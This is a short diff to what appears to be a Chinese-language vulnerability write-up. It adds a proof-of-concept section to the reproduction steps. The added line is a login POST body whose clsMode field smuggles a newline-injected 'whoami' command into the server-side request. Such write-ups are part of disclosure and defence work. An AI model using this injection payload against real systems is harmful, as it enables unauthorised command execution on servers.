@@ -16,7 +16,11 @@
 
 fid="iaytNA57019/kADk8Nev7g=="
 
-0x04 漏洞复现
+0x04 POC
+
+clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
+
+0x05 漏洞复现
 
 ```
 POST /rep/login HTTP/1.1
